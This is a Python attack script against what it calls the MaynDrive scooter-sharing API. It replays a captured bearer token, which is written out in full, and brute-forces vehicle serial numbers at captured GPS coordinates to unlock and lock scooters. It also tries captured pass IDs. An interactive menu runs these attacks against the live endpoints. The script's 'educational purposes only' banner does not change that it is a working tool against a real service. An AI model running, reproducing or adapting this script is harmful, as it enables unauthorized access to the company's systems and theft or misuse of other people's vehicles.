#!/usr/bin/env python3
"""
Final MaynDrive Attack Script
Uses correct serial number format based on API regex discovery
"""

import requests
import json
import time
import re
from datetime import datetime

# Captured data from your session
BEARER_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI5MzY1MTQ5Yi1lZDdkLTQ1Y2MtYTZiMi1lYTU0NmMyOWE2NGUiLCJpYXQiOjE3NTk0NDQxMDcsImV4cCI6MTc1OTQ0NzcwN30.ge09yj7PfvFgPeJsQmmfcm74YuQaU-dAgxtW21q-LHY"

# CORRECT API endpoints
BASE_URL = "https://api.knotcity.io"
UNLOCK_ENDPOINT = "/api/application/vehicles/unlock"
LOCK_ENDPOINT = "/api/application/vehicles/freefloat/lock"

# Headers
HEADERS = {
    "Authorization": BEARER_TOKEN,
    "Content-Type": "application/json",
    "User-Agent": "MaynDrive/1.1.34 (Android; Mobile)",
    "Accept": "application/json"
}

# Extract clean serial numbers from captured data
def extract_clean_serial(original_serial):
    """Extract clean serial number matching regex ^[a-zA-Z0-9]{6,10}$"""
    # Remove special characters and keep only alphanumeric
    clean = re.sub(r'[^a-zA-Z0-9]', '', original_serial)
    
    # Ensure it's 6-10 characters
    if len(clean) >= 6:
        return clean[:10]  # Take first 10 chars if longer
    elif len(clean) >= 3:
        return clean  # Might work if shorter
    else:
        return None

# Your captured data with clean serials
CAPTURED_SCOOTERS = [
    {
        "original": "kh.d@61f7c2e",
        "clean": "khd61f7c2e",  # 10 chars, alphanumeric only
        "lat": 47.39027698832425,
        "lng": 0.6889144890010357
    },
    {
        "original": "kh.d@c732fd5", 
        "clean": "khdc732fd5",  # 10 chars, alphanumeric only
        "lat": 47.43510309622584,
        "lng": 0.6889144890010357
    }
]

# Test different serial formats
TEST_SERIALS = [
    "61f7c2e",      # From your data (7 chars)
    "c732fd5",      # From your data (7 chars)
    "TUF061",       # From your data (6 chars)
    "TUF062",       # From your data (6 chars)
    "khd61f7c2e",   # Cleaned version (10 chars)
    "khdc732fd5",   # Cleaned version (10 chars)
    "61F7C2E",      # Uppercase version
    "C732FD5",      # Uppercase version
]

CAPTURED_PASS_IDS = ["qb.q@9243539", "u.S@e081b42", "37", "922"]

def test_token_validity():
    """Test if the captured token is still valid"""
    print("🔍 Testing token validity...")
    
    try:
        response = requests.get(f"{BASE_URL}/api/application/vehicles", headers=HEADERS, timeout=10)
        print(f"   Status: {response.status_code}")
        if response.status_code in [200, 404]:
            print("✅ Token appears to be VALID!")
            return True
        else:
            print(f"❌ Token invalid: {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ Error testing token: {e}")
        return False

def attack_unlock(serial_number, lat, lng):
    """Attempt to unlock a vehicle with correct parameters"""
    print(f"🔓 Attempting to unlock scooter: {serial_number}")
    print(f"   Location: {lat}, {lng}")
    
    payload = {
        "serial_number": serial_number,
        "lat": lat,
        "lng": lng
    }
    
    try:
        response = requests.post(f"{BASE_URL}{UNLOCK_ENDPOINT}", 
                               headers=HEADERS, 
                               json=payload, 
                               timeout=15)  # Increased timeout
        
        print(f"   Status: {response.status_code}")
        
        if response.status_code == 200:
            print("✅ UNLOCK SUCCESSFUL!")
            print(f"   Response: {response.text}")
            return True
        elif response.status_code == 400:
            try:
                error_data = response.json()
                print(f"❌ Unlock failed - {error_data}")
            except:
                print(f"❌ Unlock failed - {response.text}")
            return False
        elif response.status_code == 403:
            print(f"❌ Unlock failed - Permission denied (code 13)")
            print(f"   Response: {response.text}")
            return False
        else:
            print(f"❌ Unlock failed - Status: {response.status_code}")
            print(f"   Response: {response.text}")
            return False
            
    except requests.exceptions.Timeout:
        print("⏰ Request timed out - This might indicate a real scooter!")
        return False
    except Exception as e:
        print(f"❌ Error during unlock: {e}")
        return False

def attack_lock(vehicle_id, pass_id=None):
    """Attempt to lock a vehicle"""
    print(f"🔒 Attempting to lock vehicle: {vehicle_id}")
    if pass_id:
        print(f"   Using Pass ID: {pass_id}")
    
    payload = {
        "vehicle_id": vehicle_id
    }
    
    if pass_id:
        payload["pass_id"] = pass_id
    
    try:
        response = requests.post(f"{BASE_URL}{LOCK_ENDPOINT}", 
                               headers=HEADERS, 
                               json=payload, 
                               timeout=15)
        
        print(f"   Status: {response.status_code}")
        
        if response.status_code == 200:
            print("✅ LOCK SUCCESSFUL!")
            print(f"   Response: {response.text}")
            return True
        elif response.status_code == 400:
            try:
                error_data = response.json()
                print(f"❌ Lock failed - {error_data}")
            except:
                print(f"❌ Lock failed - {response.text}")
            return False
        else:
            print(f"❌ Lock failed - Status: {response.status_code}")
            print(f"   Response: {response.text}")
            return False
            
    except Exception as e:
        print(f"❌ Error during lock: {e}")
        return False

def test_all_serial_formats():
    """Test all possible serial number formats"""
    print("🧪 Testing all serial number formats...")
    print("=" * 60)
    
    for i, serial in enumerate(TEST_SERIALS):
        print(f"\n--- Test {i+1}: {serial} ---")
        print(f"Length: {len(serial)} chars")
        print(f"Regex match: {bool(re.match(r'^[a-zA-Z0-9]{6,10}$', serial))}")
        
        # Test with both captured locations
        for j, scooter in enumerate(CAPTURED_SCOOTERS):
            print(f"\n  Location {j+1}: {scooter['lat']}, {scooter['lng']}")
            success = attack_unlock(serial, scooter['lat'], scooter['lng'])
            
            if success:
                print("🎉 SUCCESS! This serial number worked!")
                return serial, scooter
            
            time.sleep(2)  # Wait between attempts
    
    return None, None

def test_captured_scooters():
    """Test with cleaned captured scooter data"""
    print("🎯 Testing with cleaned captured scooter data...")
    print("=" * 60)
    
    for i, scooter in enumerate(CAPTURED_SCOOTERS):
        print(f"\n--- Testing scooter {i+1} ---")
        print(f"Original: {scooter['original']}")
        print(f"Cleaned:  {scooter['clean']}")
        
        # Try unlock with cleaned serial
        success = attack_unlock(
            scooter['clean'], 
            scooter['lat'], 
            scooter['lng']
        )
        
        if success:
            time.sleep(2)
            # Try lock with different pass IDs
            for pass_id in CAPTURED_PASS_IDS:
                print(f"Testing lock with pass_id: {pass_id}")
                attack_lock(scooter['clean'], pass_id)
                time.sleep(1)
        
        time.sleep(2)

def main():
    print("=" * 60)
    print("🚨 MAYNDRIVE SECURITY EXPLOITATION DEMO (FINAL)")
    print("=" * 60)
    print("⚠️  WARNING: This is for educational purposes only!")
    print("⚠️  Only use on vehicles you own or have permission to test!")
    print("=" * 60)
    print("Using CORRECT serial number format: ^[a-zA-Z0-9]{6,10}$")
    print("=" * 60)
    
    # Test token first
    if not test_token_validity():
        print("❌ Cannot proceed - token is invalid or expired")
        return
    
    print("\n" + "=" * 60)
    print("🎯 ATTACK OPTIONS")
    print("=" * 60)
    print("1. Test all serial number formats")
    print("2. Test with cleaned captured data")
    print("3. Manual unlock test")
    print("4. Manual lock test")
    print("5. Exit")
    
    while True:
        try:
            choice = input("\nSelect option (1-5): ").strip()
            
            if choice == "1":
                working_serial, working_location = test_all_serial_formats()
                if working_serial:
                    print(f"\n🎉 FOUND WORKING SERIAL: {working_serial}")
                    print(f"🎉 WORKING LOCATION: {working_location}")
                else:
                    print("\n❌ No working serial numbers found")
                    
            elif choice == "2":
                test_captured_scooters()
                
            elif choice == "3":
                serial = input("Enter serial_number: ").strip()
                lat = float(input("Enter latitude: ").strip())
                lng = float(input("Enter longitude: ").strip())
                attack_unlock(serial, lat, lng)
                    
            elif choice == "4":
                vehicle_id = input("Enter vehicle_id: ").strip()
                pass_id = input("Enter pass_id (optional): ").strip() or None
                attack_lock(vehicle_id, pass_id)
                
            elif choice == "5":
                print("👋 Goodbye!")
                break
                
            else:
                print("Invalid choice. Please select 1-5.")
                
        except KeyboardInterrupt:
            print("\n👋 Goodbye!")
            break
        except Exception as e:
            print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
